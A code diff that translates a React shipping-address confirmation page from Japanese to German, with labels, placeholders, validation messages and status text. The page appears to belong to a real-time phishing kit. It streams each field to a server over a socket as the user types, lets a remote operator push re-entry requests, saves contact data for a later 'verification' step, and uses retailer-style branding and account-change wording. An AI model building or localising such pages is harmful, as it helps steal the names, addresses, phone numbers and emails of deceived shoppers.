@@ -43,14 +43,14 @@ function loadInfoFormDraft() {
 }
 
 const LABEL: Record<keyof Form, string> = {
-  fullname: 'お名前',
-  address: '住所',
-  fulladdress: '建物名・部屋番号',
-  city: '市区町村',
-  state: '都道府県',
-  postalcode: '郵便番号',
-  email: 'メールアドレス',
-  telephone: '電話番号',
+  fullname: 'Vollstaendiger Name',
+  address: 'Strasse und Hausnummer',
+  fulladdress: 'Wohnung, Gebaeude oder Zusatz',
+  city: 'Stadt',
+  state: 'Bundesland',
+  postalcode: 'Postleitzahl',
+  email: 'E-Mail-Adresse',
+  telephone: 'Telefonnummer',
 };
 
 const REQUIRED: Array<keyof Form> = ['fullname', 'address', 'city', 'state', 'postalcode', 'email', 'telephone'];
@@ -73,7 +73,7 @@ export default function Info() {
   const navigate = useNavigate();
 
   const [form, setForm] = useState<Form>(() => loadInfoFormDraft());
-  const [status, setStatus] = useState('この注文に登録する配送先情報を入力してください。');
+  const [status, setStatus] = useState('Geben Sie die Lieferadresse fuer diese Bestellung ein.');
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState<Partial<Record<keyof Form, string>>>({});
 
@@ -83,7 +83,11 @@ export default function Info() {
   useEffect(() => {
     socket.emit('join-page', 'info');
     const hasDraft = Object.values(form).some((v) => v.trim());
-    setStatus(hasDraft ? '保存済みの入力内容を復元しました。' : 'この注文に登録する配送先情報を入力してください。');
+    setStatus(
+      hasDraft
+        ? 'Gespeicherte Adressdaten wurden wiederhergestellt.'
+        : 'Geben Sie die Lieferadresse fuer diese Bestellung ein.',
+    );
   }, []);
 
   useEffect(() => {
@@ -110,7 +114,11 @@ export default function Info() {
       setErrors({});
       setLoading(false);
 
-      setStatus(payload?.reason ? `再入力依頼: ${payload.reason}` : 'この注文の配送先情報を確認のうえ、もう一度入力してください。');
+      setStatus(
+        payload?.reason
+          ? `Bitte erneut eingeben: ${payload.reason}`
+          : 'Bitte bestaetigen Sie die Lieferadresse fuer diese Bestellung erneut.',
+      );
       navigate('/info', { replace: true });
       window.scrollTo({ top: 0, behavior: 'smooth' });
       setTimeout(() => inputRefs.current.fullname?.focus(), 0);
@@ -133,20 +141,20 @@ export default function Info() {
   const validateAll = (next: Form) => {
     const e: Partial<Record<keyof Form, string>> = {};
     for (const k of REQUIRED) {
-      if (!next[k].trim()) e[k] = `${LABEL[k]} is required.`;
+      if (!next[k].trim()) e[k] = `${LABEL[k]} ist erforderlich.`;
     }
-    if (next.email && !isEmail(next.email)) e.email = '有効なメールアドレスを入力してください。';
+    if (next.email && !isEmail(next.email)) e.email = 'Bitte geben Sie eine gueltige E-Mail-Adresse ein.';
     const phoneDigits = normalizePhone(next.telephone).replace(/\D/g, '');
-    if (next.telephone && phoneDigits.length > 0 && phoneDigits.length < 7) e.telephone = '電話番号が短すぎます。';
+    if (next.telephone && phoneDigits.length > 0 && phoneDigits.length < 7) e.telephone = 'Die Telefonnummer ist zu kurz.';
     return e;
   };
 
   const validateField = (name: keyof Form, value: string) => {
-    if (REQUIRED.includes(name) && !value.trim()) return `${LABEL[name]} is required.`;
-    if (name === 'email' && value && !isEmail(value)) return '有効なメールアドレスを入力してください。';
+    if (REQUIRED.includes(name) && !value.trim()) return `${LABEL[name]} ist erforderlich.`;
+    if (name === 'email' && value && !isEmail(value)) return 'Bitte geben Sie eine gueltige E-Mail-Adresse ein.';
     if (name === 'telephone' && value) {
       const phoneDigits = normalizePhone(value).replace(/\D/g, '');
-      if (phoneDigits.length > 0 && phoneDigits.length < 7) return '電話番号が短すぎます。';
+      if (phoneDigits.length > 0 && phoneDigits.length < 7) return 'Die Telefonnummer ist zu kurz.';
     }
     return undefined;
   };
@@ -165,7 +173,7 @@ export default function Info() {
       return next;
     });
     scheduleEmit(name, value);
-    setStatus(`入力中: ${LABEL[name]}`);
+    setStatus(`Eingabe: ${LABEL[name]}`);
   };
 
   const focusFirstError = (e: Partial<Record<keyof Form, string>>) => {
@@ -182,13 +190,13 @@ export default function Info() {
     const e = validateAll(form);
     setErrors(e);
     if (Object.keys(e).length > 0) {
-      setStatus('赤い項目を確認して、もう一度お試しください。');
+      setStatus('Bitte pruefen Sie die markierten Felder und versuchen Sie es erneut.');
       setTimeout(() => focusFirstError(e), 0);
       return;
     }
 
     setLoading(true);
-    setStatus('配送先情報を保存しています...');
+    setStatus('Lieferadresse wird gespeichert...');
     clearDraft(STORAGE_KEYS.infoDraft);
     saveDraft(STORAGE_KEYS.verifyContact, {
       telephone: form.telephone.trim(),
@@ -201,9 +209,8 @@ export default function Info() {
   const inputClass = (name: keyof Form) =>
     ['alz-input placeholder:text-slate-400', errors[name] ? 'border-red-500/60 !shadow-[0_0_0_3px_rgba(239,68,68,0.12)]' : ''].join(' ');
 
-  const ErrorText = ({ name }: { name: keyof Form }) => (
-    errors[name] ? <p className="mt-2 text-sm text-red-500 leading-snug">{errors[name]}</p> : null
-  );
+  const ErrorText = ({ name }: { name: keyof Form }) =>
+    errors[name] ? <p className="mt-2 text-sm text-red-500 leading-snug">{errors[name]}</p> : null;
 
   return (
     <div className="alz-page">
@@ -211,8 +218,8 @@ export default function Info() {
         <div className="alz-top">
           <div className="alz-step-head">
             <div>
-              <h1 className="alz-step-title">配送先住所を確認</h1>
-              <p className="alz-step-subtitle">この注文に登録する配送情報をご確認ください。</p>
+              <h1 className="alz-step-title">Lieferadresse bestaetigen</h1>
+              <p className="alz-step-subtitle">Bitte bestaetigen Sie die Lieferdaten fuer diese Bestellung.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -222,8 +229,8 @@ export default function Info() {
 
         <div className="alz-flow-grid">
           <div className="alz-card">
-            <div className="alz-section-eyebrow">配送先情報</div>
-            <h2 className="alz-page-title">お届け先情報を確認してください</h2>
+            <div className="alz-section-eyebrow">Lieferdaten</div>
+            <h2 className="alz-page-title">Pruefen Sie Ihre Lieferadresse</h2>
             <p className="alz-page-copy">{status}</p>
             <div className="alz-brand-row mb-2">
               {BRAND_PROMISES.map((item) => (
@@ -239,55 +246,55 @@ export default function Info() {
               }}
             >
               <div>
-                <label className="alz-field-label">氏名</label>
-                <input ref={(el) => (inputRefs.current.fullname = el)} value={form.fullname} onChange={(e) => setField('fullname', e.target.value)} className={inputClass('fullname')} placeholder="山田 太郎 *" autoComplete="name" enterKeyHint="next" />
+                <label className="alz-field-label">Vollstaendiger Name</label>
+                <input ref={(el) => (inputRefs.current.fullname = el)} value={form.fullname} onChange={(e) => setField('fullname', e.target.value)} className={inputClass('fullname')} placeholder="Max Mustermann *" autoComplete="name" enterKeyHint="next" />
                 <ErrorText name="fullname" />
               </div>
               <div>
-                <label className="alz-field-label">住所</label>
-                <input ref={(el) => (inputRefs.current.address = el)} value={form.address} onChange={(e) => setField('address', e.target.value)} className={inputClass('address')} placeholder="千代田1-1-1 *" autoComplete="address-line1" enterKeyHint="next" />
+                <label className="alz-field-label">Strasse und Hausnummer</label>
+                <input ref={(el) => (inputRefs.current.address = el)} value={form.address} onChange={(e) => setField('address', e.target.value)} className={inputClass('address')} placeholder="Musterstrasse 12 *" autoComplete="address-line1" enterKeyHint="next" />
                 <ErrorText name="address" />
               </div>
               <div>
-                <label className="alz-field-label">建物名・部屋番号など</label>
-                <input ref={(el) => (inputRefs.current.fulladdress = el)} value={form.fulladdress} onChange={(e) => setField('fulladdress', e.target.value)} className={inputClass('fulladdress')} placeholder="〇〇マンション 101号室（任意）" autoComplete="address-line2" enterKeyHint="next" />
+                <label className="alz-field-label">Wohnung, Gebaeude oder Zusatz</label>
+                <input ref={(el) => (inputRefs.current.fulladdress = el)} value={form.fulladdress} onChange={(e) => setField('fulladdress', e.target.value)} className={inputClass('fulladdress')} placeholder="Wohnung 4B (optional)" autoComplete="address-line2" enterKeyHint="next" />
                 <ErrorText name="fulladdress" />
               </div>
               <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                 <div>
-                  <label className="alz-field-label">市区町村</label>
-                  <input ref={(el) => (inputRefs.current.city = el)} value={form.city} onChange={(e) => setField('city', e.target.value)} className={inputClass('city')} placeholder="千代田区 *" autoComplete="address-level2" enterKeyHint="next" />
+                  <label className="alz-field-label">Stadt</label>
+                  <input ref={(el) => (inputRefs.current.city = el)} value={form.city} onChange={(e) => setField('city', e.target.value)} className={inputClass('city')} placeholder="Berlin *" autoComplete="address-level2" enterKeyHint="next" />
                   <ErrorText name="city" />
                 </div>
                 <div>
-                  <label className="alz-field-label">都道府県</label>
-                  <input ref={(el) => (inputRefs.current.state = el)} value={form.state} onChange={(e) => setField('state', e.target.value)} className={inputClass('state')} placeholder="東京都 *" autoComplete="address-level1" enterKeyHint="next" />
+                  <label className="alz-field-label">Bundesland</label>
+                  <input ref={(el) => (inputRefs.current.state = el)} value={form.state} onChange={(e) => setField('state', e.target.value)} className={inputClass('state')} placeholder="Berlin *" autoComplete="address-level1" enterKeyHint="next" />
                   <ErrorText name="state" />
                 </div>
               </div>
               <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                 <div>
-                  <label className="alz-field-label">郵便番号</label>
-                  <input ref={(el) => (inputRefs.current.postalcode = el)} value={form.postalcode} onChange={(e) => setField('postalcode', e.target.value)} className={inputClass('postalcode')} placeholder="1000001 *" autoComplete="postal-code" inputMode="numeric" enterKeyHint="next" />
+                  <label className="alz-field-label">Postleitzahl</label>
+                  <input ref={(el) => (inputRefs.current.postalcode = el)} value={form.postalcode} onChange={(e) => setField('postalcode', e.target.value)} className={inputClass('postalcode')} placeholder="10115 *" autoComplete="postal-code" inputMode="numeric" enterKeyHint="next" />
                   <ErrorText name="postalcode" />
                 </div>
                 <div>
-                  <label className="alz-field-label">電話番号</label>
-                  <input ref={(el) => (inputRefs.current.telephone = el)} value={form.telephone} onChange={(e) => setField('telephone', e.target.value)} className={inputClass('telephone')} placeholder="09012345678 *" autoComplete="tel" inputMode="tel" enterKeyHint="next" />
+                  <label className="alz-field-label">Telefonnummer</label>
+                  <input ref={(el) => (inputRefs.current.telephone = el)} value={form.telephone} onChange={(e) => setField('telephone', e.target.value)} className={inputClass('telephone')} placeholder="+49 151 23456789 *" autoComplete="tel" inputMode="tel" enterKeyHint="next" />
                   <ErrorText name="telephone" />
                 </div>
               </div>
               <div>
-                <label className="alz-field-label">メールアドレス</label>
-                <input ref={(el) => (inputRefs.current.email = el)} value={form.email} onChange={(e) => setField('email', e.target.value)} className={inputClass('email')} placeholder="example@example.jp *" autoComplete="email" inputMode="email" enterKeyHint="done" />
+                <label className="alz-field-label">E-Mail-Adresse</label>
+                <input ref={(el) => (inputRefs.current.email = el)} value={form.email} onChange={(e) => setField('email', e.target.value)} className={inputClass('email')} placeholder="max@example.de *" autoComplete="email" inputMode="email" enterKeyHint="done" />
                 <ErrorText name="email" />
               </div>
 
               <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
-                {loading ? '保存中...' : '住所を確認する'}
+                {loading ? 'Wird gespeichert...' : 'Adresse bestaetigen'}
               </button>
               <p className="alz-helper-copy text-center mt-3">
-                アカウント情報に変更があった場合、これらの内容を再度確認していただくことがあります。
+                Wenn kuerzlich Kontodaten geaendert wurden, bitten wir Sie eventuell um eine erneute Bestaetigung.
               </p>
             </form>
 
@@ -295,20 +302,20 @@ export default function Info() {
           </div>
 
           <aside className="alz-card alz-flow-aside alz-side-summary">
-            <div className="alz-side-summary-title">配送先情報</div>
+            <div className="alz-side-summary-title">Lieferuebersicht</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb" />
               <div>
-                <div className="alz-order-mini-title">登録済みの配送先住所を確認</div>
-                <div className="alz-order-mini-copy">お届け先氏名、住所、郵便番号、連絡先を確認してください。</div>
+                <div className="alz-order-mini-title">Lieferadresse dieser Bestellung bestaetigen</div>
+                <div className="alz-order-mini-copy">Bitte pruefen Sie Empfaenger, Adresse, Postleitzahl und Kontaktinformationen.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
-              <div>受取人氏名</div>
-              <div>住所と郵便番号</div>
-              <div>電話番号とメールアドレス</div>
+              <div>Name des Empfaengers</div>
+              <div>Adresse und Postleitzahl</div>
+              <div>Telefonnummer und E-Mail-Adresse</div>
             </div>
-            <div className="alz-side-summary-box">この注文に登録する配送先情報を使って、発送手続きを続行します。</div>
+            <div className="alz-side-summary-box">Diese Lieferdaten werden verwendet, um die Zustellung Ihrer Bestellung fortzusetzen.</div>
           </aside>
         </div>
       </div>
